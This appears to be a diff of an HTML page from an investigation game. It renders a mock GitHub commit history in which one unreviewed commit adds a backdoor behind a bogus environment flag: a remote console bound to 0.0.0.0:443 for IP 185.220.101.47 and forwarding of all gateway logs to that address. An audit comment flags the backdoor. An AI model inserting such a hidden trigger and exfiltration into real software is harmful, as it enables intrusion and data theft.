@@ -503,39 +503,54 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 .enig-section{background:var(--s1);border:1px solid var(--bd);border-radius:7px;padding:14px}
 .enig-section-title{font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--bd)}
 .enig-msgs{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.gh-repo{background:#0e0e0e;border:1px solid var(--bd);border-radius:8px;padding:14px 16px;margin-bottom:14px}
-.gh-repo-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:7px}
-.gh-repo-path{font-family:var(--mono);font-size:15px;color:#e6e6e6}
-.gh-org{color:#8ab4f8}
-.gh-repo-path b{color:#8ab4f8;font-weight:700}
-.gh-branch{font-size:11px;font-family:var(--mono);color:#cfe0ff;background:#16233a;border:1px solid #2a3a5c;border-radius:20px;padding:2px 10px}
-.gh-repo-meta{font-size:11px;color:var(--tx3)}
-.gh-repo-desc{font-size:12.5px;color:#c8c8c8;line-height:1.6}
-.gh-commits{border:1px solid var(--bd);border-radius:8px;overflow:hidden;margin-bottom:16px}
-.gh-commits-head{background:#0e0e0e;border-bottom:1px solid var(--bd);padding:9px 14px;font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#c8c8c8}
-.gh-commit{display:flex;align-items:center;gap:12px;padding:11px 14px;border-bottom:1px solid var(--bd);background:#0b0b0b}
-.gh-commit:last-child{border-bottom:none}
-.gh-commit.danger{background:#160a0a;border-left:3px solid #b91c1c}
-.gh-avatar{width:30px;height:30px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;font-family:var(--mono)}
-.gh-commit-main{flex:1;min-width:0}
-.gh-commit-msg{font-size:13.5px;color:#f0f0f0;font-weight:600;line-height:1.4;margin-bottom:3px}
-.gh-commit-sub{font-size:11.5px;color:var(--tx2)}
-.gh-commit-sub b{color:#e0e0e0;font-weight:600}
-.gh-badge{display:inline-block;font-size:10px;font-weight:600;padding:1px 8px;border-radius:20px;margin-left:4px;white-space:nowrap}
-.gh-badge.ok{background:#0f2a16;color:#5fd48a;border:1px solid #1f5130}
-.gh-badge.no{background:#2a0d0d;color:#fca5a5;border:1px solid #5f2020}
-.gh-commit-side{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0}
-.gh-hash{font-family:var(--mono);font-size:12px;color:#8ab4f8;background:#0e1626;border:1px solid #23324e;border-radius:5px;padding:2px 7px}
-.gh-verified{font-size:10px;color:#5fd48a;font-weight:600}
-.gh-unverified{font-size:10px;color:#fca5a5;font-weight:600}
-.gh-diff{border:1px solid var(--bd);border-radius:8px;overflow:hidden}
-.gh-diff-head{background:#0e0e0e;border-bottom:1px solid var(--bd);padding:9px 14px;font-family:var(--mono);font-size:12px;color:#d4d4d4;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-.gh-diff-stat .add{color:#5fd48a;font-weight:700}
-.gh-diff-body{margin:0;padding:12px 14px;background:#0b0b0b;font-family:var(--mono);font-size:12.5px;line-height:1.9;overflow-x:auto}
-.gh-ln{display:block;white-space:pre-wrap}
-.gh-ln.ctx{color:#9a9a9a}
-.gh-ln.add{color:#8fe6b0;background:rgba(46,160,67,.13)}
-.gh-note{padding:11px 14px;border-top:1px solid var(--bd);background:#0e0e0e;font-size:12.5px;color:#c8c8c8;line-height:1.6}
+#panel-programmation .enig-scroll{background:#0d1117;color:#e6edf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}
+.ghx a{color:#58a6ff;text-decoration:none}
+.ghx-repobar{display:flex;align-items:center;gap:7px;font-size:16px;margin-bottom:12px}
+.ghx-repobar svg{fill:#8b949e;flex-shrink:0}
+.ghx-repobar .name{color:#58a6ff;font-weight:600}
+.ghx-repobar .sep{color:#8b949e}
+.ghx-priv{font-size:11px;color:#8b949e;border:1px solid #30363d;border-radius:2em;padding:0 7px;margin-left:2px;font-weight:500}
+.ghx-branch{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:#e6edf3;background:#21262d;border:1px solid #30363d;border-radius:6px;padding:4px 10px;margin-bottom:16px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.ghx-branch svg{fill:#8b949e}
+.ghx-card{border:1px solid #30363d;border-radius:6px;overflow:hidden;margin-bottom:18px;background:#0d1117}
+.ghx-card-head{background:#161b22;border-bottom:1px solid #30363d;padding:9px 16px;font-size:13px;color:#e6edf3;font-weight:600}
+.ghx-commit{display:flex;align-items:center;gap:10px;padding:11px 16px;border-bottom:1px solid #21262d}
+.ghx-commit:last-child{border-bottom:none}
+.ghx-commit.flag{background:rgba(187,128,9,.07)}
+.ghx-commit-body{flex:1;min-width:0}
+.ghx-commit-msg{font-size:14px;color:#e6edf3;font-weight:600;line-height:1.35}
+.ghx-commit-meta{font-size:12px;color:#8b949e;margin-top:3px}
+.ghx-commit-meta b{color:#c9d1d9;font-weight:600}
+.ghx-av{border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-family:ui-monospace,monospace;width:22px;height:22px;font-size:9px}
+.ghx-right{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.ghx-verified{font-size:11px;color:#3fb950;border:1px solid #238636;border-radius:2em;padding:0 8px;background:rgba(46,160,67,.12);font-weight:600}
+.ghx-unverified{font-size:11px;color:#d29922;border:1px solid #9e6a03;border-radius:2em;padding:0 8px;background:rgba(187,128,9,.12);font-weight:600}
+.ghx-sha{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px;color:#8b949e;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:2px 8px}
+.ghx-diffsum{font-size:13px;color:#8b949e;margin:2px 0 10px}
+.ghx-diffsum b{color:#e6edf3}
+.ghx-diffsum .add{color:#3fb950;font-weight:600}
+.ghx-file{border:1px solid #30363d;border-radius:6px;overflow:hidden}
+.ghx-file-head{background:#161b22;border-bottom:1px solid #30363d;padding:8px 12px;display:flex;align-items:center;gap:10px;font-size:12px}
+.ghx-file-head svg{fill:#8b949e}
+.ghx-file-head .path{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;color:#e6edf3}
+.ghx-file-head .st{margin-left:auto;font-family:ui-monospace,monospace;font-size:12px}
+.ghx-file-head .st .add{color:#3fb950;font-weight:600}
+.ghx-diff{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,'Liberation Mono',monospace;font-size:12.5px;line-height:20px;background:#0d1117;overflow-x:auto}
+.ghx-row{display:flex;white-space:pre;min-width:max-content}
+.ghx-gut{width:42px;flex-shrink:0;text-align:right;padding:0 10px;color:#6e7681;user-select:none}
+.ghx-code{flex:1;padding:0 6px;color:#e6edf3;white-space:pre}
+.ghx-mark{display:inline-block;width:14px;color:#6e7681}
+.ghx-row.add{background:rgba(46,160,67,.15)}
+.ghx-row.add .ghx-gut{background:rgba(46,160,67,.30);color:#3fb950}
+.ghx-row.add .ghx-mark{color:#3fb950}
+.ghx-hunk{background:#161b22;color:#8b949e}
+.ghx-hunk .ghx-code{color:#8b949e}
+.ghx-review{border-top:1px solid #30363d;background:#0d1117;padding:14px 16px;display:flex;gap:10px}
+.ghx-review .ghx-av{width:28px;height:28px;font-size:10px}
+.ghx-review-body{flex:1;min-width:0}
+.ghx-review-head{font-size:12px;color:#8b949e;margin-bottom:5px}
+.ghx-review-head b{color:#e6edf3}
+.ghx-review-text{font-size:13px;color:#e6edf3;line-height:1.55;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 12px}
 .enig-msg{background:var(--s2);border-left:2px solid #333;padding:10px 12px;border-radius:0 4px 4px 0;font-size:13px;color:var(--tx2);line-height:1.65}
 .enig-msg-label{font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.06em;margin-bottom:5px;text-transform:uppercase}
 .enig-ref{font-size:12.5px;color:#cccccc;font-weight:500;padding:9px 12px;background:#0f0f0f;border:1px solid var(--bd);border-radius:5px;line-height:1.6}
@@ -886,69 +901,94 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 
         <!-- PROGRAMMATION -->
         <div class="panel" id="panel-programmation">
-          <div class="enig-scroll">
-            <div class="gh-repo">
-              <div class="gh-repo-head">
-                <span class="gh-repo-path"><span class="gh-org">elecarm-dsi</span> / <b>supervision-bx</b></span>
-                <span class="gh-branch">main</span>
-                <span class="gh-repo-meta">Depot interne DSI, prive</span>
-              </div>
-              <div class="gh-repo-desc">Historique des modifications du code du programme de supervision deploye sur les passerelles de telemaintenance BX. Chaque changement est normalement associe a un ticket de suivi et une revue avant deploiement en production.</div>
+          <div class="enig-scroll ghx">
+
+            <div class="ghx-repobar">
+              <svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path></svg>
+              <a class="name">elecarm-dsi</a><span class="sep">/</span><a class="name">supervision-bx</a>
+              <span class="ghx-priv">Private</span>
             </div>
 
-            <div class="gh-commits">
-              <div class="gh-commits-head">Commits sur main, agent_superviseur.py / config_ntp.yaml</div>
+            <span class="ghx-branch">
+              <svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path></svg>
+              main
+            </span>
 
-              <div class="gh-commit">
-                <div class="gh-avatar" style="background:#3d5a80">JM</div>
-                <div class="gh-commit-main">
-                  <div class="gh-commit-msg">Mise a jour du format d'export des mesures pour le rapport Thales</div>
-                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 12 mai 2026 a 11h15 <span class="gh-badge ok">TICK-4180 . revue OK</span></div>
+            <div class="ghx-card">
+              <div class="ghx-card-head">Historique, agent_superviseur.py</div>
+
+              <div class="ghx-commit">
+                <div class="ghx-av" style="background:#1f6feb">JM</div>
+                <div class="ghx-commit-body">
+                  <div class="ghx-commit-msg">Mise a jour du format d'export des mesures pour le rapport Thales</div>
+                  <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 12 mai 2026, TICK-4180</div>
                 </div>
-                <div class="gh-commit-side"><span class="gh-hash">a3f9c21</span><span class="gh-verified">verifie</span></div>
+                <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">a3f9c21</span></div>
               </div>
 
-              <div class="gh-commit danger">
-                <div class="gh-avatar" style="background:#7f1d1d">JM</div>
-                <div class="gh-commit-main">
-                  <div class="gh-commit-msg">Ajout d'une condition ouvrant une console d'administration distante et la remontee de l'ensemble des flux de la passerelle</div>
-                  <div class="gh-commit-sub"><b>j.moreau</b> depuis WS-MOREAU-01 (session RDP) le 9 mai 2026 a 03h02 <span class="gh-badge no">Aucun ticket . pousse en prod</span></div>
+              <div class="ghx-commit flag">
+                <div class="ghx-av" style="background:#8b1a1a">JM</div>
+                <div class="ghx-commit-body">
+                  <div class="ghx-commit-msg">Ajout d'une condition ouvrant une console d'administration distante et la remontee de l'ensemble des flux de la passerelle</div>
+                  <div class="ghx-commit-meta"><b>j.moreau</b> depuis WS-MOREAU-01 (session RDP) le 9 mai 2026, 03h02, aucun ticket associe</div>
                 </div>
-                <div class="gh-commit-side"><span class="gh-hash">e7d0b4a</span><span class="gh-unverified">non revu</span></div>
+                <div class="ghx-right"><span class="ghx-unverified">Unverified</span><span class="ghx-sha">e7d0b4a</span></div>
               </div>
 
-              <div class="gh-commit">
-                <div class="gh-avatar" style="background:#3d5a80">JM</div>
-                <div class="gh-commit-main">
-                  <div class="gh-commit-msg">Correctif : le module de telemetrie journalisait deux fois la meme mesure</div>
-                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 30 avril 2026 a 16h47 <span class="gh-badge ok">TICK-4139 . revue OK</span></div>
+              <div class="ghx-commit">
+                <div class="ghx-av" style="background:#1f6feb">JM</div>
+                <div class="ghx-commit-body">
+                  <div class="ghx-commit-msg">Correctif, le module de telemetrie journalisait deux fois la meme mesure</div>
+                  <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 30 avril 2026, TICK-4139</div>
                 </div>
-                <div class="gh-commit-side"><span class="gh-hash">b1c8f34</span><span class="gh-verified">verifie</span></div>
+                <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">b1c8f34</span></div>
               </div>
 
-              <div class="gh-commit">
-                <div class="gh-avatar" style="background:#3d5a80">JM</div>
-                <div class="gh-commit-main">
-                  <div class="gh-commit-msg">Ajout du serveur de synchronisation horaire Azure NTP (20.42.73.18) en secours</div>
-                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 22 avril 2026 a 09h10 <span class="gh-badge ok">TICK-4118 . revue OK</span></div>
+              <div class="ghx-commit">
+                <div class="ghx-av" style="background:#1f6feb">JM</div>
+                <div class="ghx-commit-body">
+                  <div class="ghx-commit-msg">Ajout du serveur de synchronisation horaire Azure NTP (20.42.73.18) en secours</div>
+                  <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 22 avril 2026, TICK-4118</div>
                 </div>
-                <div class="gh-commit-side"><span class="gh-hash">4a90de2</span><span class="gh-verified">verifie</span></div>
+                <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">4a90de2</span></div>
               </div>
 
-              <div class="gh-commit">
-                <div class="gh-avatar" style="background:#3d5a80">JM</div>
-                <div class="gh-commit-main">
-                  <div class="gh-commit-msg">Augmentation du delai de retry TCP (3s vers 8s) suite aux instabilites reseau atelier</div>
-                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 15 avril 2026 a 14h22 <span class="gh-badge ok">TICK-4102 . revue OK</span></div>
+              <div class="ghx-commit">
+                <div class="ghx-av" style="background:#1f6feb">JM</div>
+                <div class="ghx-commit-body">
+                  <div class="ghx-commit-msg">Augmentation du delai de retry TCP (3s vers 8s) suite aux instabilites reseau atelier</div>
+                  <div class="ghx-commit-meta"><b>j.moreau</b> a valide le 15 avril 2026, TICK-4102</div>
                 </div>
-                <div class="gh-commit-side"><span class="gh-hash">c2e5170</span><span class="gh-verified">verifie</span></div>
+                <div class="ghx-right"><span class="ghx-verified">Verified</span><span class="ghx-sha">c2e5170</span></div>
               </div>
             </div>
 
-            <div class="gh-diff">
-              <div class="gh-diff-head">agent_superviseur.py <span class="gh-diff-stat"><span class="add">+3</span></span> . commit <span class="gh-hash">e7d0b4a</span> . 9 mai 2026 03h02</div>
-              <pre class="gh-diff-body"><span class="gh-ln ctx"># agent_superviseur.py</span><span class="gh-ln add">+ if os.environ.get('THALES_TEST_MODE') == '1':</span><span class="gh-ln add">+     start_remote_console(bind='0.0.0.0', port=443, allow_ip='185.220.101.47')</span><span class="gh-ln add">+     forward_all_traffic_logs(to='185.220.101.47')</span></pre>
-              <div class="gh-note">Cette modification ouvre une console d'administration distante et renvoie l'ensemble des journaux de la passerelle vers 185.220.101.47 (voir Journaux / Logs). Elle a ete poussee pendant la session RDP non autorisee du 08/05 23h44 (voir Journaux / Logs, agent WS-MOREAU), sans passer par le circuit habituel de ticket et de revue applique aux autres commits.</div>
+            <div class="ghx-diffsum">Commit <b>e7d0b4a</b>, 1 fichier modifie avec <span class="add">3 ajouts</span> et 0 suppression.</div>
+
+            <div class="ghx-file">
+              <div class="ghx-file-head">
+                <svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path d="M2 1.75C2 .784 2.784 0 3.75 0h6.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v9.586A1.75 1.75 0 0 1 13.25 16h-9.5A1.75 1.75 0 0 1 2 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h9.5a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 9 4.25V1.5Zm6.75.062V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path></svg>
+                <span class="path">agent_superviseur.py</span>
+                <span class="st"><span class="add">+3</span> -0</span>
+              </div>
+              <div class="ghx-diff">
+                <div class="ghx-row ghx-hunk"><span class="ghx-gut"></span><span class="ghx-gut"></span><span class="ghx-code"><span class="ghx-mark"> </span>@@ -40,7 +40,10 @@ def start_supervision(cfg):</span></div>
+                <div class="ghx-row"><span class="ghx-gut">40</span><span class="ghx-gut">40</span><span class="ghx-code"><span class="ghx-mark"> </span>    channel = open_gateway_channel(cfg.host)</span></div>
+                <div class="ghx-row"><span class="ghx-gut">41</span><span class="ghx-gut">41</span><span class="ghx-code"><span class="ghx-mark"> </span>    push_metrics(channel, cfg.internal_server)</span></div>
+                <div class="ghx-row"><span class="ghx-gut">42</span><span class="ghx-gut">42</span><span class="ghx-code"><span class="ghx-mark"> </span></span></div>
+                <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">43</span><span class="ghx-code"><span class="ghx-mark">+</span>    if os.environ.get('THALES_TEST_MODE') == '1':</span></div>
+                <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">44</span><span class="ghx-code"><span class="ghx-mark">+</span>        start_remote_console(bind='0.0.0.0', port=443, allow_ip='185.220.101.47')</span></div>
+                <div class="ghx-row add"><span class="ghx-gut"></span><span class="ghx-gut">45</span><span class="ghx-code"><span class="ghx-mark">+</span>        forward_all_traffic_logs(to='185.220.101.47')</span></div>
+                <div class="ghx-row"><span class="ghx-gut">43</span><span class="ghx-gut">46</span><span class="ghx-code"><span class="ghx-mark"> </span></span></div>
+                <div class="ghx-row"><span class="ghx-gut">44</span><span class="ghx-gut">47</span><span class="ghx-code"><span class="ghx-mark"> </span>    run_forever(channel)</span></div>
+              </div>
+              <div class="ghx-review">
+                <div class="ghx-av" style="background:#6e40c9">AD</div>
+                <div class="ghx-review-body">
+                  <div class="ghx-review-head"><b>audit-dsi</b> a laisse un commentaire de revue</div>
+                  <div class="ghx-review-text">Ces 3 lignes ajoutees ouvrent une console d'administration distante sur le port 443 et renvoient l'ensemble des journaux de la passerelle vers l'adresse 185.220.101.47 (voir Journaux / Logs). La variable THALES_TEST_MODE n'existe dans aucune configuration officielle : ce code n'a aucune raison d'etre. Il a ete pousse sans ticket ni revue, pendant la session RDP non autorisee du 08/05 23h44.</div>
+                </div>
+              </div>
             </div>
 
           </div>
